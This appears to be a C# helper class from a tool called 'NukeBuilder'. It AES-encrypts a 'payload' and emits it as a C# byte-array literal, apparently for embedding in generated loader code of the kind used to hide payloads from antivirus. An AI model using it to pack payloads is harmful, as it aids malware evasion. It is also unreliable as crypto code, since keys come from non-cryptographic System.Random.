using System;
using System.Linq;
using System.Security.Cryptography;

namespace NukeBuilder.Algorithms.EncryptHelper
{
    internal class AESEncrypt
    {
        private static readonly Random random = new Random();

        public static byte[] EncryptPayload(byte[] data, byte[] key, byte[] iv)
        {
            var aes = Aes.Create();
            aes.Key = key;
            aes.IV = iv;

            var encryptor = aes.CreateEncryptor();
            return encryptor.TransformFinalBlock(data, 0, data.Length);
        }

        public static string GenerateHexArray(byte[] data)
        {
            return "new byte[] { " + string.Join(", ", data.Select(b => "0x" + b.ToString("X2"))) + " };";
        }
        public static byte[] GenerateRandomBytes(int length)
        {
            byte[] bytes = new byte[length];
            random.NextBytes(bytes);
            return bytes;
        }

        public static string GenerateStrBytes(int length)
        {
            byte[] bytes = new byte[length];
            random.NextBytes(bytes);

            return BitConverter.ToString(bytes).Replace("-", " ");
        }

        public static string GenerateRandStr(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }
    }
}
